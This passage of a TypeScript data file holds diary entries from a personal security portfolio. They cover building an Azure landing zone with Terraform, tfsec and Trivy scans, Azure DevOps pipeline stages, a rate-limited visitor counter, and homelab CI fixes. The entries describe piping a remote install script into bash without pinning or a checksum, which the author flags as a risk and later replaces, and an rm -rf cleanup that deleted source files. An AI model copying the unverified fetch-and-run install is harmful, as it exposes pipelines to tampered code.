export interface DiaryLab {
  title: string
  notes: string[]
  solution: string
  /** Whether the lab was fully solved. Some blind/OAST labs are blocked behind Burp Pro. */
  status?: 'completed' | 'in-progress' | 'blocked'
  /** Path to a reference screenshot, relative to src/assets, e.g. 'Burp/Lab10.webp' */
  screenshot?: string
  /** Additional reference screenshots, relative to src/assets. Rendered after `screenshot`. */
  screenshots?: string[]
  /** Path to an accompanying automation script, relative to src/assets, e.g. 'LabScripts/sqli_solver.py' */
  script?: string
}

export interface DiaryEntry {
  id: string
  /** ISO date string, e.g. '2026-07-28'. Used for sorting. */
  date: string
  category: string
  /** Broad vulnerability class this entry belongs to, used for filtering (e.g. 'SQL Injection', 'XSS'). */
  vulnTypes: string[]
  title: string
  /** What you actually did that day. */
  workedOn: string[]
  /** Intro or reflection before lab breakdown. */
  body: string[]
  /** Per-lab write-ups with solutions. */
  labs?: DiaryLab[]
  /** Before/after (or standalone) code snippets, rendered as labelled code blocks after `body`. */
  codeSnippets?: { label: string; code: string }[]
  tools?: string[]
  tags?: string[]
  link?: { label: string; url: string }
  /** Multiple external references, rendered as a list after `link`. */
  links?: { label: string; url: string }[]
  milestone?: boolean
  screenshot?: string
  screenshots?: string[]
}

/**
 * Add new posts at the top of this array (newest first).
 * Keep dates as YYYY-MM-DD so sorting stays correct.
 */
export const cyberDiaryEntries: DiaryEntry[] = [
  {
    id: 'secure-azure-landing-zone-entry-9-tfsec-to-trivy',
    date: '2026-09-24',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    title: 'Swapping tfsec for Trivy, and a replacement that half-failed',
    workedOn: [
      "Replaced tfsec, installed by piping a script from GitHub's master branch into bash with no version pin or checksum, with Trivy v0.74.0 downloaded from the GitHub release and verified against its SHA-256 checksum file before extracting",
      'Added set -euo pipefail after finding the checksum check did nothing: bash kept running after the failed check, so a tampered download would have printed FAILED and been installed anyway',
      'Pasted the storage account fixes onto the Key Vault by mistake. terraform validate flagged the unsupported settings, but not the misplaced #trivy:ignore comments',
      'Trivy found four storage account problems tfsec had passed. Fixed two (network_rules deny default, infrastructure encryption) and accepted two (GRS replication, Storage Analytics logging) with written #trivy:ignore reasons',
      'The infrastructure encryption change forced a replace that failed halfway: Azure rejected the new account with StorageAccountAlreadyTaken 6 seconds after Terraform deleted the old one. Renamed the empty account and deployed a fresh plan',
    ],
    body: [
      "The tfsec install piped a script from GitHub's master branch straight into bash, with no version pin and no checksum. tfsec's own logs also said it's being folded into Trivy. I replaced it with Trivy v0.74.0, downloaded directly from the GitHub release and checked against the release's SHA-256 checksum file before extracting.",
      'I made two mistakes along the way. The checksum check did nothing at first. Bash keeps running after a failed command unless you tell it otherwise, so a tampered download would have printed FAILED and then been installed and run anyway. set -euo pipefail at the top of the script turned the check into a real gate.',
      "I also pasted the fixes onto the Key Vault instead of the storage account. terraform validate caught the settings the Key Vault doesn't support. It would not have caught the misplaced #trivy:ignore comments, because they're valid syntax attached to the wrong resource.",
      "Trivy found four problems on the storage account that tfsec had passed. I fixed two: a network_rules deny default and infrastructure encryption. I accepted the other two with inline #trivy:ignore comments and written reasons. GRS replication is a durability and cost choice for an account holding no data. Storage Analytics logging would only cover queues, which I don't use, so the proper fix is diagnostic settings sent to Log Analytics later.",
      "Infrastructure encryption can't be enabled on an existing account, so the plan showed a replace (-/+). Terraform deleted the account, then tried to create the new one 6 seconds later. Azure rejected it with StorageAccountAlreadyTaken, because globally unique names take time to be released after a deletion. The account was empty, so I renamed it and deployed a fresh plan.",
      "Lesson: a replace is a delete followed by a create, and it can fail between the two. On an account holding real data, I'd plan that change as a migration.",
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ14.webp',
      'SecureAzureLandingZone/SALZ15.webp',
      'SecureAzureLandingZone/SALZ16.webp',
    ],
    tools: ['Trivy', 'Terraform', 'Azure DevOps', 'Azure'],
    tags: [
      'Secure Azure Landing Zone',
      'Trivy',
      'supply chain security',
      'checksum verification',
      'Terraform',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-8-tfsec-fixes-first-apply',
    date: '2026-09-24',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    milestone: true,
    title: 'Fixing the tfsec findings and the first real deployment',
    workedOn: [
      'Fixed the CRITICAL tfsec finding by adding a network_acls block with default_action = "Deny" and bypass = "AzureServices". Setting public_network_access_enabled = false did not satisfy the scanner; it wanted the deny rule written into the config',
      'Fixed the MEDIUM finding by setting soft_delete_retention_days = 7 alongside purge_protection_enabled',
      'Ran terraform fmt to fix a misindented network_acls block that would have failed the fmt -check stage before the scan ran',
      'First real Apply: Validate -> Security Scan -> Plan -> manual approval -> Apply ran green end to end, and salz-rg now exists in Azure with the VNet, subnet, deny-by-default NSG, storage account, and Key Vault',
    ],
    body: [
      'Yesterday the security scan flagged two problems with my Key Vault config. Today I fixed both and got the whole pipeline green for the first time.',
      'The CRITICAL finding needed a network_acls block with default_action = "Deny" and bypass = "AzureServices". The MEDIUM finding needed soft_delete_retention_days = 7, which keeps deleted secrets recoverable for a week before anyone can purge them. I indented the new block wrong, which would have failed fmt -check before the scan ran; terraform fmt fixed it.',
      'The first real Apply ran the full pipeline end to end, and salz-rg now exists in Azure. I wrote every resource in it, and none of it deployed until the scanner passed it.',
      'The Portal showed four resource groups where I expected two. Azure creates NetworkWatcherRG the first time a VNet appears in a region, and linking Azure DevOps to the subscription creates VisualStudioOnline-<id>. I left both alone. I also should not delete Terraform-managed resources by hand in the Portal, because Terraform state would stop matching what exists in Azure. terraform destroy is the tool for that.',
      'Yesterday the gate blocked a deployment. Today I fixed the Key Vault config until it passed, and left the check itself untouched.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ12.webp',
      'SecureAzureLandingZone/SALZ13.webp',
    ],
    tools: ['Terraform', 'Azure', 'Azure DevOps', 'tfsec'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'Key Vault',
      'tfsec',
      'CI/CD pipeline',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-7-main-tf-resource-by-resource',
    date: '2026-09-23',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    title: 'Writing the actual Terraform: main.tf, resource by resource',
    workedOn: [
      'Wrote the landing zone\'s real infrastructure by hand, validating after each addition: resource group, VNet + subnet, NSG (deny-by-default, no explicit rules, relying on Azure\'s implicit deny-all), NSG-subnet association, storage account, Key Vault',
      'Learned the implicit dependency graph: writing azurerm_resource_group.main.name instead of a literal string tells Terraform the creation and destruction order, with no depends_on needed',
      'Learned data sources vs resources: data "azurerm_client_config" "current" {} reads who Terraform is authenticated as (used for tenant_id on the Key Vault) without creating anything',
      'Set security defaults myself instead of relying on the provider: TLS 1.2 minimum, HTTPS-only, and no public network access on the storage account; RBAC authorization and purge protection on Key Vault',
      "Learned that purge_protection_enabled can't be turned off for the life of the vault, so enabling it is a decision to make up front",
      'Left variables.tf for later (everything is hardcoded) and flagged it in the repo, a reasonable tradeoff for a proof of concept',
      'Fixed a housekeeping bug: terraform fmt -check flagged trailing whitespace and misaligned = signs from editing by hand. Running terraform fmt without -check cleared them',
      'Ran the pipeline against the new main.tf: tfsec flagged two findings on the Key Vault, a critical missing network ACL and a medium finding for soft_delete_retention_days not explicitly set',
    ],
    body: [
      "Wrote the landing zone's real infrastructure by hand, resource by resource, validating after each addition: resource group, then VNet and subnet, then an NSG (deny-by-default, no explicit rules, relying on Azure's implicit deny-all), the NSG-subnet association, a storage account, and a Key Vault.",
      'Two Terraform concepts clicked while I wrote this. The first was the implicit dependency graph: writing azurerm_resource_group.main.name instead of retyping a literal string tells Terraform the creation and destruction order, with no depends_on needed. The second was data sources versus resources. data "azurerm_client_config" "current" {} reads who Terraform is authenticated as (I used it to get tenant_id for the Key Vault) and creates nothing.',
      "I set security defaults myself instead of relying on the provider's: TLS 1.2 minimum, HTTPS-only, and no public network access on the storage account; RBAC authorization and purge protection on Key Vault. purge_protection_enabled can't be turned off for the life of the vault, so I had to decide on it up front.",
      "I left variables.tf for later, so everything is hardcoded for now. That's a reasonable tradeoff for a proof of concept, and I flagged it in the repo.",
      'terraform fmt -check also flagged trailing whitespace and misaligned = signs from editing by hand. Running terraform fmt without -check fixes them, and it is worth doing before each commit.',
      'Ran the pipeline against the new main.tf and tfsec came back with two findings on the Key Vault: a critical for the missing network ACL, and a medium for soft_delete_retention_days not being explicitly set.',
    ],
    codeSnippets: [
      {
        label: 'tfsec finding: azure-keyvault-specify-network-acl',
        code: `Result #1 CRITICAL Vault network ACL does not block access by default.
────────────────────────────────────────────────────────────────────────────────
  main.tf:57-66
────────────────────────────────────────────────────────────────────────────────
   57    resource "azurerm_key_vault" "main" {
   58      name                          = "salz-kv-cg314214"
   59      location                      = azurerm_resource_group.main.location
   60      resource_group_name           = azurerm_resource_group.main.name
   61      tenant_id                     = data.azurerm_client_config.current.tenant_id
   62      sku_name                      = "standard"
   63      purge_protection_enabled      = true
   64      enable_rbac_authorization     = true
   65      public_network_access_enabled = false
   66  }
────────────────────────────────────────────────────────────────────────────────
          ID azure-keyvault-specify-network-acl
      Impact Without a network ACL the key vault is freely accessible
  Resolution Set a network ACL for the key vault

  More Information
  - https://aquasecurity.github.io/tfsec/v1.28.14/checks/azure/keyvault/specify-network-acl/
  - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls`,
      },
      {
        label: 'tfsec finding: azure-keyvault-no-purge',
        code: `Result #2 MEDIUM Resource should have soft_delete_retention_days set between 7 and 90 days in order to enable purge protection.
────────────────────────────────────────────────────────────────────────────────
  main.tf:57-66
────────────────────────────────────────────────────────────────────────────────
   57    resource "azurerm_key_vault" "main" {
   58      name                          = "salz-kv-cg314214"
   59      location                      = azurerm_resource_group.main.location
   60      resource_group_name           = azurerm_resource_group.main.name
   61      tenant_id                     = data.azurerm_client_config.current.tenant_id
   62      sku_name                      = "standard"
   63      purge_protection_enabled      = true
   64      enable_rbac_authorization     = true
   65      public_network_access_enabled = false
   66  }
────────────────────────────────────────────────────────────────────────────────
          ID azure-keyvault-no-purge
      Impact Keys could be purged from the vault without protection
  Resolution Enable purge protection for key vaults

  More Information
  - https://aquasecurity.github.io/tfsec/v1.28.14/checks/azure/keyvault/no-purge/
  - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled`,
      },
    ],
    tools: ['Terraform', 'Azure', 'tfsec'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'Key Vault',
      'infrastructure as code',
      'tfsec',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-6-apply-stage-deployment-jobs',
    date: '2026-09-23',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    milestone: true,
    title: 'Azure DevOps pipeline: Apply stage, deployment jobs and manual approval',
    workedOn: [
      'Built the final stage using a deployment: job targeting the production ADO Environment, with an approval check attached, rather than a bare job:',
      'The deployment: job makes ADO pause and wait for a human to approve before any real infrastructure changes, so the pipeline enforces segregation of duties on every run',
      "Hit two bugs from the same root misunderstanding: deployment jobs don't behave like regular job:s",
      "First: deployment jobs don't auto-checkout the source repo the way regular jobs do, so terraform apply had no .tf files or backend config until an explicit - checkout: self step was added",
      "Second: the downloaded plan artifact lands under $(Pipeline.Workspace)/<artifact-name>/, separate from the checked-out source, so apply had to run from the terraform/ source directory while pointing at the plan file by its full workspace path",
      'Pipeline is now end-to-end: Validate -> Security Scan -> Plan (published as artifact) -> manual approval gate -> Apply, applying the exact approved plan rather than re-planning',
    ],
    body: [
      "Built the final stage with a deployment: job targeting the production ADO Environment, with an approval check attached, instead of a bare job:. That makes ADO pause the pipeline and wait for a human to approve before any real infrastructure changes, so the pipeline enforces segregation of duties on every run.",
      "I hit two bugs from the same misunderstanding: deployment jobs behave differently from regular job:s. First, deployment jobs don't auto-checkout the source repo the way regular jobs do. Without a - checkout: self step, terraform apply had no .tf files or backend config to work with.",
      'Second, the downloaded plan artifact lands under $(Pipeline.Workspace)/<artifact-name>/, separate from the checked-out source. I had to run apply from the terraform/ source directory and point it at the plan file by its full workspace path.',
      "I had treated deployment: and job: as a naming difference. They come with different defaults, and I only found out when files I expected weren't there.",
      'The pipeline now runs end to end: Validate -> Security Scan -> Plan, published as an artifact -> a manual approval gate -> Apply, using the exact approved plan instead of re-planning. I debugged every stage out of a real failure before it passed.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ10.webp',
      'SecureAzureLandingZone/SALZ11.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'deployment gate',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-5-plan-stage-oidc-auth',
    date: '2026-09-23',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    milestone: true,
    title: 'Azure DevOps pipeline: Plan stage, bootstrap and OIDC auth debugging',
    workedOn: [
      'Built the Plan stage, the biggest stage yet and the first to touch real Azure',
      'Bootstrapped state infra: a standalone rg-tfstate resource group, storage account, and blob container to hold Terraform state, kept separate from the landing zone resources and created by hand with az cli instead of Terraform',
      'Set up an Azure Resource Manager service connection (azure-landing-zone-connection) using workload identity federation, so the pipeline authenticates with a short-lived federated token instead of a stored secret',
      'Debugged an auth failure: a vague "Backend initialization required" error hid the real cause further up the log: Authenticating using the Azure CLI is only supported as a User, not a Service Principal',
      "Fixed it by exporting ARM_CLIENT_ID, ARM_TENANT_ID, ARM_SUBSCRIPTION_ID, ARM_USE_OIDC=true, and ARM_OIDC_TOKEN, since AzureCLI@2's az login session does not carry over to Terraform's azurerm provider. They use separate auth chains",
      'Caught a typo (misaligned artifact: under publish:) before it ran, and flagged the tfsec curl | bash install with a ponytail: comment so the shortcut is on record',
      'End state: terraform plan -out=tfplan runs against real remote state, and the plan file publishes as a pipeline artifact for the next stage to consume unchanged',
    ],
    body: [
      'Built the Plan stage today, the biggest one so far and the first to touch real Azure resources rather than pipeline scaffolding.',
      "I bootstrapped state first: a standalone rg-tfstate resource group, storage account, and blob container to hold Terraform's state, kept separate from the landing zone resources and created by hand with az cli. Terraform can't create the storage it needs to hold its own state, so that storage has to exist first. Then I set up a service connection (azure-landing-zone-connection) using workload identity federation, so the pipeline gets a short-lived federated token per run instead of a stored secret.",
      'The auth debugging took the longest. The first run failed with a vague "Backend initialization required" error, and the actual cause sat higher in the log: Authenticating using the Azure CLI is only supported as a User, not a Service Principal. When AzureCLI@2 logs in via az login, it does not hand that session to Terraform\'s azurerm provider or backend; they use separate auth mechanisms. I fixed it by exporting ARM_CLIENT_ID, ARM_TENANT_ID, ARM_SUBSCRIPTION_ID, ARM_USE_OIDC=true, and ARM_OIDC_TOKEN from the variables ADO exposes via addSpnToEnvironment: true. Next time I will check which auth chain a tool uses before assuming a logged-in CLI covers it.',
      'I also caught a misaligned artifact: under publish: before it ran, and flagged the tfsec curl | bash install with a ponytail: comment so the shortcut is on record.',
      'terraform plan -out=tfplan now runs against real remote state, and the plan file publishes as a pipeline artifact for the next stage to consume unchanged.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ8.webp',
      'SecureAzureLandingZone/SALZ9.webp',
    ],
    links: [
      {
        label: 'terraform plan output artifact',
        url: '/salz-plan-stage.tfplan',
      },
    ],
    tools: ['Azure DevOps', 'Terraform', 'Azure CLI', 'OIDC', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'OIDC',
      'workload identity federation',
    ],
  },
  {
    id: 'visitor-map-entry-1-build-and-rate-limit',
    date: '2026-09-23',
    category: 'Visitor Map',
    vulnTypes: ['Visitor Map'],
    milestone: true,
    title: 'Small feature, first backend: a visitor map with a rate limit',
    workedOn: [
      'Added an anonymous, country-level visitor counter - a Cloudflare Worker plus a KV namespace, called from the portfolio on page load. First real backend this site has had',
      "Fixed a CORS bug (Worker only allowed the production origin, so local dev was locked out) and a map-library bug (its color scale collapses to one flat color when only one country has data yet)",
      'Pulled it out of the main nav in favour of a small corner badge on the homepage that links through to the full map - a whole tab felt like too much for a visitor counter',
      'Security-reviewed the finished feature and found one real gap: POST /visit had no rate limiting, so it could be curled directly and the counter inflated regardless of CORS',
      "Closed it with Cloudflare's native Rate Limiting binding (10 req/60s per IP) instead of hand-rolling one, and proved it works: 14 requests in a row, 429s from the 11th on",
    ],
    body: [
      "This is a small feature, and also the site's first actual backend; everything else is static. A Cloudflare Worker plus KV holds the counters, called from the frontend and separate from the GitHub Pages deploy.",
      "I hit two real bugs. CORS locked out local dev until I made the Worker reflect the request origin against an allowlist. The map library paints every country the same colour when only one has data, because its min/max scale collapses to one value; I wrote my own styleFunction instead of using the default.",
      "I security-reviewed it even though it's small, and the review found the one real gap: no rate limit on the write endpoint. CORS is a browser-only restriction, so a direct curl loop skips it. I fixed it with Cloudflare's own binding, then checked that it throttles.",
    ],
    tools: ['Cloudflare Workers', 'Cloudflare KV', 'React', 'TypeScript', 'Wrangler'],
    tags: [
      'Visitor Map',
      'Cloudflare Workers',
      'CORS',
      'rate limiting',
      'privacy by design',
      'security review',
    ],
    links: [
      {
        label: 'Live on the site',
        url: 'https://charlesgoodsir.com/#/visitors',
      },
      {
        label: 'Risk assessment for this feature',
        url: 'https://charlesgoodsir.com/#/visitors/risk-assessment',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-21-azure-pipelines-lan-self-hosted-agent',
    date: '2026-09-19',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    milestone: true,
    title: 'Getting Azure Pipelines fully working: LAN reachability and a self-hosted agent',
    workedOn: [
      'Fixed the SAST stage: switched Semgrep from a job-level container to a plain docker run (matching gitleaks and Trivy), then dropped SEMGREP_APP_TOKEN, which forces "logged in" mode and conflicts with passing explicit --config rulesets',
      'Cleared 66 of 72 Semgrep findings as false positives: it was scanning committed ZAP HTML reports for "plaintext http links" inside their own reference text, fixed with a .semgrepignore for dast/',
      'Fixed the 6 remaining real findings: a Dockerfile running as root, a missing Dependabot cooldown period, an unpinned Terraform TLS setting, and one nginx Host-header finding reviewed and suppressed with a nosemgrep comment, since the backend never reads that header',
      'Added Dependabot update grouping so weekly runs produce one PR per ecosystem instead of a dozen',
      'Found the real blocker on the deploy stage: Azure hosted agents run on the public internet and cannot reach a private LAN address, full stop',
      'Fixed it by installing a self-hosted Azure Pipelines agent on the mini PC itself, so the deploy job runs from inside the LAN with plain docker compose and zap-baseline.py, no SSH/SCP or secure-file key management needed',
      'Chased three bugs that came with it: a stale manually-deployed container claiming the compose project\'s container names, ZAP unable to reach localhost:8080 because a container\'s localhost is its own network namespace (fixed with --network host), and the backend crash-looping on SQLite Error 14 because an earlier hardening change (non-root container user) broke write access to the database directory',
      'Ran a second-pass security review once everything was green: confirmed the self-hosted agent has root-equivalent access to the mini PC (expected for any self-hosted runner, not a flaw, but worth being precise about), confirmed the old SSH deploy key is fully revoked, and flagged checking whether the public repo requires approval before a fork PR gets free compute',
    ],
    body: [
      'Every stage of the new Azure Pipelines setup surfaced its own real failure once it actually ran.',
      'The SAST stage broke twice: Azure\'s job-level container: mechanism could not run the semgrep/semgrep image, fixed by switching to a plain docker run like gitleaks and Trivy already used; then Semgrep itself refused to run, since a set SEMGREP_APP_TOKEN forces "logged in" mode, which conflicts with passing explicit --config rulesets. Dropped the token, since the goal is specific OWASP rulesets, not org-managed policies. That surfaced 72 findings, 66 of them false positives from Semgrep scanning committed ZAP HTML reports for "plaintext http links" in their own reference text - cleared with a .semgrepignore for dast/. The remaining six were genuine, including one nginx Host-header finding suppressed with a nosemgrep comment explaining why the backend never reads that header.',
      "The deploy stage was the real lesson. Azure's hosted agents run on the public internet and cannot reach a private LAN address, full stop, regardless of IP or SSH key config. The fix was a self-hosted Azure Pipelines agent on the mini PC itself, so the deploy job runs from inside the LAN with plain docker compose and zap-baseline.py, no more SSH/SCP or secure-file key management.",
      "That brought three more bugs: a stale manually-deployed container holding the compose project's container names; ZAP unable to reach localhost:8080 because a container's localhost is its own network namespace, fixed with --network host; and the backend crash-looping on SQLite Error 14, caused by an earlier hardening change (non-root container user) that broke write access to the database directory.",
      'Once everything passed, I went back through with a second, security-focused pass, since a green pipeline and an explainable trust model are different bars. That confirmed the self-hosted agent has root-equivalent access to the mini PC (expected for any self-hosted runner, worth stating rather than glossing over), confirmed the old SSH deploy key is fully revoked, and turned up one thing still to check: whether the public repo requires approval before a fork PR gets free compute.',
    ],
    screenshots: [
      'Homelab/HomeLabAzurePipelines2.webp',
      'Homelab/HomeLabAzurePipelines3.webp',
      'Homelab/HomeLabAzurePipelines4.webp',
      'Homelab/HomeLabAzurePipelines5.webp',
    ],
    links: [
      {
        label: 'Semgrep initial scan (72 findings, before cleanup)',
        url: '/semgrep-initial-scan.sarif',
      },
      {
        label: 'Semgrep final scan (reviewed nginx finding)',
        url: '/semgrep-final-scan.sarif',
      },
      {
        label: 'ZAP baseline report, from the self-hosted deploy stage',
        url: '/zap-baseline-report.html',
      },
    ],
    tools: ['Azure Pipelines', 'Semgrep', 'ZAP', 'Docker', 'Dependabot'],
    tags: [
      'AppSec homelab',
      'Azure Pipelines',
      'CI/CD pipeline',
      'self-hosted agent',
      'SAST',
    ],
  },
  {
    id: 'appsec-homelab-entry-20-azure-pipelines-migration-dependabot-gap',
    date: '2026-09-19',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    milestone: true,
    title: 'Migrating to Azure Pipelines, and finding a silent Dependabot gap',
    workedOn: [
      'Migrated the homelab CI/CD pipeline from GitHub Actions to Azure Pipelines, porting all eight jobs: secret scan, SAST, build, dependency scan, test, container scan, staged deploy, summary',
      'Translated the core concepts, not the syntax: jobs became stages containing jobs, secrets.X became a Library variable group, the SSH deploy key became a secure file, and the required-reviewer gate became an Environment approval check',
      'Fixed a real pipeline bug: Azure Pipelines needs a container declared under resources.containers rather than referenced inline',
      'The dependency-scan stage flagged a high-severity vulnerability in a transitive package, SQLitePCLRaw.lib.e_sqlite3, via Microsoft.EntityFrameworkCore.Sqlite',
      'That led to a bigger find: 12 stale Dependabot branches with fixes ready but no PRs ever opened, across NuGet, npm, and GitHub Actions',
      'Root cause: default_workflow_permissions was set to read, with PR creation disabled, so Dependabot could create update branches but never open a PR',
      'Fixed the permission, deleted the 12 stale branches so Dependabot rebuilds them with real PRs, and fixed the EF Core vulnerability directly',
    ],
    body: [
      'With the Terraform/Azure work done, I wanted the homelab CI/CD pipeline running on Azure Pipelines instead of GitHub Actions - a better fit for the DevOps roles I am targeting, and worth having alongside the AWS-flavoured GitHub Actions setup.',
      "It was not a copy-paste job. Azure Pipelines and GitHub Actions share the same underlying ideas - jobs, stages, dependencies - but the syntax barely overlaps. GitHub's jobs became Azure's stages containing jobs; secrets.X became a Library variable group referenced as $(X); the SSH deploy key became a secure file downloaded at runtime; the required-reviewer gate had to be rebuilt as an Environment approval check. Porting all eight jobs meant understanding what each step actually did, not translating it line by line.",
      'The first run surfaced two failures. One was a real YAML bug: Azure Pipelines wants a container declared under resources.containers rather than referenced inline, so the Semgrep job could not find its image. Straightforward once I understood the schema difference.',
      'The second was more interesting. The dependency-scan stage caught a high-severity vulnerability in a transitive package, SQLitePCLRaw.lib.e_sqlite3, pulled in via Microsoft.EntityFrameworkCore.Sqlite. That led me to notice something Dependabot should have caught already: a branch existed with the exact fix, Microsoft.EntityFrameworkCore.Sqlite-9.0.20, but no PR had ever been opened for it. The repo had 12 such orphaned branches across NuGet, npm, and GitHub Actions.',
      "The repo's Actions permissions API showed why: default_workflow_permissions was set to read, with PR creation disabled. Dependabot uses the same repo-level permission gate as GitHub Actions to open PRs, so it had been creating update branches every week and stopping there. I flipped \"Allow GitHub Actions to create and approve pull requests\" in Settings, deleted the 12 stale branches so Dependabot rebuilds them with real PRs on its next run, and fixed the EF Core vulnerability directly.",
      'Dependabot had been running for weeks without a single update reaching review. The pipeline caught the vulnerability it introduced; the permissions setting is what let 12 fixes sit unopened.',
    ],
    screenshots: ['Homelab/HomeLabAzurePipelines1.webp'],
    tools: ['Azure Pipelines', 'GitHub Actions', 'Dependabot', 'YAML'],
    tags: [
      'AppSec homelab',
      'Azure Pipelines',
      'CI/CD pipeline',
      'dependency scanning',
      'supply chain security',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-4-security-scan-tfsec',
    date: '2026-09-18',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    title: 'Azure DevOps pipeline: SecurityScan stage with tfsec',
    workedOn: [
      'Added a SecurityScan stage, dependsOn: Validate, so it only runs after validation passes',
      "Chose tfsec over Checkov: a single lightweight binary, the same download-a-release-and-run pattern as the Terraform install in stage 1, and purpose-built for Azure IaC rather than Checkov's heavier multi-cloud/compliance scope",
      'Hit one bug before it ran clean: a missing line break collapsed bash and tfsec terraform/ into a single garbled command (bashtfsec)',
      'Same root cause as the earlier curl wrapping issue - pasted or edited YAML script blocks are plain shell text, and a lost newline merges two commands into one broken one',
      'main.tf has no real resource blocks yet, so tfsec found nothing to flag - the stage proves the mechanism works but catches nothing real until azurerm_* resources exist',
      "Noted for later: install uses curl | bash from tfsec's install script with no version pin or checksum - fine for a personal pipeline, but a real production setup should pin an exact tfsec release and verify a checksum rather than trust a mutable script at run time",
    ],
    body: [
      'Added a SecurityScan stage, dependsOn: Validate, so it only runs once validation passes.',
      "Chose tfsec over Checkov. tfsec is a single lightweight binary - the same download-a-release-and-run pattern as the Terraform install in stage 1 - and purpose-built for Azure IaC. Checkov is heavier, general-purpose, multi-cloud and compliance-focused, more than this pipeline needs right now.",
      'Hit one bug before the stage ran clean: a missing line break collapsed bash and tfsec terraform/ into a single garbled command, bashtfsec. Same root cause as the earlier curl wrapping issue - pasted or edited YAML script blocks are plain shell text, and a lost newline merges two commands into one broken one.',
      'main.tf still has no real resource blocks, so tfsec found nothing to flag. The stage proves the mechanism works; it will not catch anything real until actual azurerm_* resources exist.',
      "Shortcut noted for later: install uses curl | bash from tfsec's install script, with no version pin or checksum. Fine for a personal, learning pipeline. A real production setup should pin an exact tfsec release and verify a checksum instead of trusting a mutable script at run time.",
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ6.webp',
      'SecureAzureLandingZone/SALZ7.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'tfsec', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'tfsec',
      'infrastructure as code',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-3-init-validate-complete',
    date: '2026-09-18',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    milestone: true,
    title: 'Azure DevOps pipeline: Validate stage complete',
    workedOn: [
      'Added the final two steps: terraform init -backend=false and terraform validate',
      "Chose -backend=false on purpose - the remote state backend isn't configured yet (backend.tf is still a TODO), and validate-time init only needs providers resolved, not a working backend or state lock",
      'Pipeline ran clean end to end',
      'main.tf is still just TODO comments with no real resource blocks, so validate passes on an empty config with nothing to check - the mechanism works, but checks nothing meaningful yet',
      'Validate stage is now complete: install Terraform → fmt -check → init -backend=false → validate, all gated on a clean agent workspace after fixing the earlier directory collision bug',
      'Next: Stage 2, the security scan (tfsec or Checkov)',
    ],
    body: [
      'Added the last two steps in the Validate stage: terraform init -backend=false and terraform validate.',
      "-backend=false is a deliberate choice. The remote state backend isn't configured yet - backend.tf is still a TODO - and validate-time init only needs providers resolved, not a working backend or a state lock.",
      'The pipeline ran clean end to end. main.tf is still just TODO comments with no real resource blocks, so validate passes on an empty config with nothing to check. The mechanism works; it isn\'t checking anything meaningful yet. That changes once real azurerm_* resources go in.',
      'Validate stage is complete: install Terraform → fmt -check → init -backend=false → validate, all gated on a clean agent workspace after fixing the directory collision bug from the previous entry.',
      'Next: Stage 2, the security scan, with tfsec or Checkov.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ4.webp',
      'SecureAzureLandingZone/SALZ5.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'infrastructure as code',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-2-fmt-check-directory-collision',
    date: '2026-09-18',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    title: 'Azure DevOps pipeline: terraform fmt -check deletes its own source folder',
    workedOn: [
      'Added a terraform fmt -check -diff step, scoped to workingDirectory: terraform',
      'It failed with Not found workingDirectory: /home/vsts/work/1/s/terraform. First checked remotes, branches, and service connections - all fine',
      "Cause: the Install Terraform script's rm -rf terraform terraform.zip ran at the checkout root, where my repo's own terraform/ source folder lives, and deleted the source before the fmt step ran",
      'Fixed by installing Terraform inside its own tf-install/ subdirectory, so the install and cleanup logic can no longer touch checked-out source',
      "Also lost a fix by editing the pipeline YAML in ADO's web editor while the same file was open locally: that editor commits straight to main and overwrote the uncommitted local edit",
    ],
    body: [
      'Added terraform fmt -check -diff, scoped to workingDirectory: terraform. It failed: Not found workingDirectory: /home/vsts/work/1/s/terraform. Checked remotes, branches, and service connections first, assuming a GitHub or ADO connection problem. All fine.',
      "The Install Terraform script's rm -rf terraform terraform.zip ran at the checkout root - the same directory my repo's own terraform/ source folder lives in. The downloaded Terraform binary was named terraform, colliding with the source directory of the same name. That rm -rf deleted my source folder before the next step ran.",
      'Fixed by installing Terraform inside its own tf-install/ subdirectory instead of the repo root, so the install and cleanup logic can no longer touch checked-out source files.',
